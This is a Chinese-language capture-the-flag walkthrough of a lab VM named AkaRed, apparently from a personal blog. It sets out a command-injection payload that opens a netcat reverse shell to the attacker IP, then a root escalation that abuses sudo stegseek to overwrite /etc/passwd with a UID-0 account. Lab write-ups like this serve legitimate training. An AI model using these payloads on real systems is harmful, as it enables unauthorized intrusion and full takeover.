## 1. 简介

**靶机名称**: AkaRed (未发布，内部测试靶机，可能后续发布于 HackMyVm)
**难度**: 超级简单
**攻击者 IP:** `192.168.205.128` (Kali Linux)
**目标 IP:** `192.168.205.185` (AkaRed)

## 1. 信息收集 (Enumeration)

此阶段旨在发现目标并了解其开放的服务。

### 1.1. 网络发现 (Network Discovery)

使用 `arp-scan` 在本地网络中探测存活主机，因为它通过 ARP 请求进行扫描，通常比 IP/端口扫描更快且不易被防火墙拦截。

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo arp-scan -l # -l 表示扫描本地网络

Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
# ... (其他主机) ...
192.168.205.185 08:00:27:3b:24:68       PCS Systemtechnik GmbH  # <-- 发现目标
# ... (其他主机) ...

Ending arp-scan 1.10.0: 256 hosts scanned in 2.036 seconds (125.74 hosts/sec). 4 responded
```

目标主机 IP 确定为 `192.168.205.185`。MAC 地址 `08:00:27:3b:24:68` 对应的厂商 `PCS Systemtechnik GmbH` 通常与 Oracle VirtualBox 相关联。

### 1.2. 端口扫描 (Port Scanning)

使用 `nmap` 对目标进行端口扫描，识别开放的 TCP 端口及运行的服务。

* 首先进行全端口扫描 (`-p-`)，确保不遗漏任何可能开放的端口。

  ```bash
  ┌──(kali㉿kali)-[~/test]
  └─$ nmap -p- 192.168.205.185    
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
  Nmap scan report for 192.168.205.185
  Host is up (0.00016s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
  ```

* 针对已发现的端口进行更详细的服务版本探测。

  ```bash
  ┌──(kali㉿kali)-[~/test]
  └─$ nmap -p22,80 -sV 192.168.205.185
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
  Nmap scan report for 192.168.205.185
  Host is up (0.00027s latency).
  
  PORT   STATE SERVICE    VERSION
  22/tcp open  tcpwrapped
  80/tcp open  http       Apache httpd 2.4.59 ((Debian))
  MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
  ```

  扫描结果确认端口 22 (SSH) 和 80 (HTTP) 开放。

### 1.3. Web 服务探测 (Web Enumeration)

使用 `curl` 检查 80 端口的 HTTP 服务，获取网页内容。

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl 192.168.205.185
<!DOCTYPE html>
<html>
<head>
    <title>CyberPing 2077</title>
    <!-- ... CSS (已省略) ... -->
</head>
<body>
    <div class="container">
        <h1 class="glitch">⮟ CYBERPING 2077 ⮟</h1>
        <form method="post">
            <input type="text" name="ip" placeholder="Enter target IP/command" required>
            <button type="submit">Execute Command</button>
        </form>
    </div>
</body>
</html>
```

网页标题为 "CyberPing 2077"，包含一个表单，输入框 `name="ip"` 且提示为 "Enter target IP/command"。这极有可能是一个允许用户输入 IP 地址执行 `ping` 命令的功能，并且存在命令注入的风险。

![](https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411202259981.png)

## 2. 获取初始访问权限 (Initial Access - Command Injection)

此阶段利用 Web 应用的漏洞获取目标服务器的 Shell。

### 2.1. 确认漏洞 (Confirming Vulnerability)

为验证命令注入，我们在 Web 表单中输入攻击者的 IP 地址 `192.168.205.128`，并期望目标服务器执行 `ping 192.168.205.128`。同时，在攻击者机器上启动 `tcpdump` 监听 ICMP 流量。

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp
# -A: 以 ASCII 打印报文内容
# -n: 不解析主机名
# icmp: 只捕获 ICMP 协议流量
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

![](https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411202357686.png)

在 Web 页面提交 IP 后，`tcpdump` 捕获到来自目标 IP 的 ICMP 请求：

```bash
20:23:39.932006 IP 192.168.205.185 > 192.168.205.128: ICMP echo request, id 1016, seq 1, length 64
# ... (其他 ICMP 请求和响应) ... 
```

这证实了 Web 应用确实执行了用户输入的命令（至少是 `ping`），存在命令注入漏洞。

### 2.2. 漏洞利用 (Exploitation - Reverse Shell)

利用命令注入点执行一个反向 Shell Payload。使用分号 `;` 作为命令分隔符，先结束可能存在的 `ping` 命令，然后执行 `netcat` 命令将目标服务器的 `/bin/bash` Shell 反弹回攻击者机器。

* **Payload:**

  ```
  ;nc 192.168.205.128 8888 -e /bin/bash
  ```

  (注意：`;` 确保 `nc` 命令独立执行。`-e /bin/bash` 指定连接成功后执行的程序。)

* **攻击者监听:** 在 Kali 上使用 `netcat` 监听 8888 端口。

  ```bash
  ┌──(kali㉿kali)-[~/test]
  └─$ nc -lvnp 8888
  # -l: 监听模式
  # -v: 详细输出
  # -n: 不解析主机名
  # -p 8888: 指定监听端口
  listening on [any] 8888 ...
  ```

* **获取 Shell:** 在 Web 页面提交 Payload 后，攻击者的 `nc` 监听器接收到连接。

  ```bash
  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 56366
  # 此时已获得目标服务器 Shell，用户为 www-data
  ```

  成功获取了运行 Web 服务器的用户 (`www-data`) 的 Shell。

### 2.3. Shell 升级 (Shell Upgrade)

初始获得的 Shell 通常是非交互式的，功能受限（如没有 Tab 补全、无法运行 `sudo` 等）。需要升级为功能完整的 TTY。

```bash
# 在目标 Shell 中执行:
$ script /dev/null -c bash   # 使用 script 创建一个伪终端
# 按下 Ctrl+Z 将其置于后台

# 在攻击者 Kali 终端中执行:
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg      # 设置本地终端模式，并将后台任务调回前台
# 按两次 Enter 键

# 回到目标 Shell 中执行:
reset xterm                  # 重置终端类型
export TERM=xterm            # 设置终端环境变量
export SHELL=/bin/bash       # 设置 SHELL 环境变量
stty rows 59 cols 236      # (可选) 设置终端尺寸以匹配本地终端
```

现在拥有了一个功能更完善的交互式 Shell。

## 3. 权限提升 (www-data -> welcome)

此阶段目标是从 `www-data` 用户提升到权限更高的用户。

### 3.1. 以 www-data 身份进行信息收集 (Enumeration as www-data)

* **Web 目录探索:**

  ```bash
  www-data@AkaRed:/var/www/html$ ls -al
  total 16
  # ...
  -rw-r--r-- 1 root root   21 Apr 11 06:26 robots.txt
  ```

  发现 `robots.txt` 文件。

* **检查 `robots.txt`:**

  ```bash
  www-data@AkaRed:/var/www/html$ cat robots.txt 
  d2VsY29tZTpha2FyZWQ=
  ```

  这是一串 Base64 编码的字符串。

* **解码 Base64:**

  ```bash
  www-data@AkaRed:/var/www/html$ echo 'd2VsY29tZTpha2FyZWQ=' | base64 -d
  welcome:akared
  ```

  解码得到凭据 `welcome:akared`。尝试使用此凭据 `su welcome`，但根据后续操作判断，此密码 **不正确** 。

* **检查家目录:**

  ```bash
  www-data@AkaRed:/var/www/html$ ls /home/
  welcome
  ```

  确认存在用户 `welcome`。

* **检查 `/opt` 目录:**

  ```bash
  www-data@AkaRed:/opt$ ls -al
  total 32
  # ...
  -rwxr-xr-x  1 root root 16912 Apr 11 06:41 showmepassword
  ```

  发现一个名为 `showmepassword` 的可执行文件。

* **运行 `showmepassword`:**

  ```bash
  www-data@AkaRed:/opt$ ./showmepassword 
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  now it is 1 count.
  ```

  程序提示需要运行 1000 次才能获得密码。

* **编写脚本运行 1000 次:**

  ```bash
  www-data@AkaRed:/opt$ for i in {1..1000}; do ./showmepassword; done
  # ... (大量输出省略) ...
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  now it is 998 count.
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  d2VsY2  # <-- 获取到密码片段
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  d2VsY2
  input to /tmp/xxoo
  when input 1000 count. u will get password.
  d2VsY2
  ```

  在接近 1000 次时，程序输出了字符串 `d2VsY2`。这很可能是 `welcome` 用户的密码。

### 3.2. 切换用户 (Switching User)

使用从 `showmepassword` 获取的密码 `d2VsY2` 尝试切换到 `welcome` 用户。

```bash
www-data@AkaRed:/opt$ su welcome
Password: <在此输入 'd2VsY2'>
welcome@AkaRed:/opt$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

成功切换到 `welcome` 用户。

## 4. 权限提升 (welcome -> root)

此阶段目标是从 `welcome` 用户提升到 `root` 用户。

### 4.1. 以 welcome 身份进行信息收集 (Enumeration as welcome)

检查 `welcome` 用户的 `sudo` 权限。

```bash
welcome@AkaRed:/opt$ sudo -l
Matching Defaults entries for welcome on AkaRed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User welcome may run the following commands on AkaRed:
    (ALL : ALL) NOPASSWD: /usr/local/bin/stegseek
```

关键发现：用户 `welcome` 可以 **无需密码** (`NOPASSWD`) 以 **任何用户** (`ALL : ALL`) 的身份运行 `/usr/local/bin/stegseek` 命令。`stegseek` 是一个用于破解 `steghide` 隐写密码并提取隐藏文件的工具。其 `-xf <outfile>` 选项允许将提取的文件写入指定路径，这是一个潜在的提权向量。

### 4.2. 利用策略 (Exploitation Strategy)

利用 `sudo stegseek` 的 `-xf` 选项覆盖 `/etc/passwd` 文件，从而添加一个自定义的 root 用户。

1.  **在攻击者机器上：**
    *   创建一个包含自定义 root 用户条目的文件 (`malicious_passwd`)。该条目使用已知的密码哈希。
    *   使用 `steghide` 将此文件隐藏到一个图片 (`1.jpg`) 中，并设置一个简单的密码（如 "123456"）。
    *   启动 Web 服务器以托管此图片。
2.  **在目标机器上 (以 welcome 用户身份)：**
    *   下载包含恶意 `passwd` 条目的图片。
    *   创建一个包含 `steghide` 密码 ("123456") 的文件。
    *   使用 `sudo /usr/local/bin/stegseek <image_file> <password_file> -xf /etc/passwd` 命令，强制 `stegseek` 将隐藏的文件提取并覆盖到 `/etc/passwd`。
    *   使用新添加的 root 用户名和对应密码进行 `su` 登录。

### 4.3. 构造利用代码 (Attacker Machine)

1. **创建恶意 passwd 文件 (`malicious_passwd`)**:

   *   创建一个新用户 `a`，UID 和 GID 均为 0 (root 权限)。
   *   设置一个已知的密码哈希。这里使用 `$1$user3$rAGRVf5p2jYTqtqOW5cPu/` (假设攻击者知道其对应的明文密码，例如 'pass123')。

   ```bash
   ┌──(kali㉿kali)-[~/test]
   └─$ echo 'a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash' > malicious_passwd 
   ```

2. **准备载体图片 (`1.jpg`)**:

   ```bash
   ┌──(kali㉿kali)-[~/test]
   └─$ cp ~/Pictures/1.jpg . # 复制一个任意的 JPG 图片
   ```

3. **使用 `steghide` 嵌入数据**:

   ```bash
   ┌──(kali㉿kali)-[~/test]
   └─$ steghide embed -ef malicious_passwd -cf 1.jpg -p "123456" 
   # -ef: 指定要嵌入的文件
   # -cf: 指定载体文件
   # -p: 设置嵌入/提取密码
   embedding "malicious_passwd" in "1.jpg"... done
   ```

4. **启动 HTTP 服务器托管图片**:

   ```bash
   ┌──(kali㉿kali)-[~/test]
   └─$ python3 -m http.server 80 # 在 80 端口启动简单 HTTP 服务器                                                                    
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

### 4.4. 执行利用代码 (Target Machine)

1. **切换到可写目录并下载图片**: `/tmp` 通常是所有用户都可写的目录。

   ```bash
   welcome@AkaRed:/opt$ cd /tmp
   welcome@AkaRed:/tmp$ wget http://192.168.205.128/1.jpg
   # ... (下载输出) ...
   2025-04-11 08:29:34 (220 MB/s) - ‘1.jpg’ saved [396237/396237]
   ```

2. **创建密码文件 (`1`)**:

   ```bash
   welcome@AkaRed:/tmp$ echo '123456' > 1
   ```

3. **执行 `sudo stegseek` 覆盖 `/etc/passwd`**:

   ```bash
   welcome@AkaRed:/tmp$ sudo /usr/local/bin/stegseek 1.jpg 1 -xf /etc/passwd
   # <image_file>: 载体图片
   # <password_file>: 包含密码的字典文件
   # -xf /etc/passwd: 将提取的文件强制写入 /etc/passwd
   StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
      
   [i] Found passphrase: "123456"
   [i] Original filename: "malicious_passwd".
   [i] Extracting to "/etc/passwd".
   the file "/etc/passwd" does already exist. overwrite ? (y/n) 
   y # 确认覆盖
   ```

4. **验证 `/etc/passwd` 内容**:

   ```bash
   welcome@AkaRed:/tmp$ cat /etc/passwd
   a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash
   ```

   文件已被成功修改为只包含我们添加的 `a` 用户条目。

### 4.5. 获取 Root 权限 (Gaining Root Access)

使用新添加的用户 `a` 和之前设置的密码（例如 'pass123'）进行登录。

```bash
welcome@AkaRed:/tmp$ su a
Password: <输入 'pass123' 或对应哈希的密码>
a@AkaRed:/tmp# id
uid=0(a) gid=0(root) groups=0(root)
```成功获取 root 权限。
```

## 5. 总结 (Conclusion)

本次渗透测试通过以下步骤成功获取了 AkaRed 靶机的 root 权限：

1.  **信息收集:** 通过 `arp-scan` 和 `nmap` 发现目标 IP 及开放的 SSH (22) 和 HTTP (80) 端口。
2.  **初始访问:** 利用 Web 应用 "CyberPing 2077" (端口 80) 存在的 **命令注入漏洞**，执行 `netcat` 反向 Shell，获得 `www-data` 用户权限。
3.  **第一次提权:** 在 `/opt` 目录下发现 **特殊的可执行文件 `showmepassword`**，通过脚本运行 1000 次获得密码 `d2VsY2`，成功 `su` 切换到 `welcome` 用户。（`robots.txt` 中的凭据在此路径无效）。
4.  **第二次提权:** 发现 `welcome` 用户拥有 **无需密码即可通过 `sudo` 执行 `/usr/local/bin/stegseek`** 的权限。利用 `stegseek` 的 `-xf` 选项，**覆盖 `/etc/passwd` 文件**，添加了一个自定义的 root 用户 (`a`)，最终使用该用户成功登录，获得 root 权限。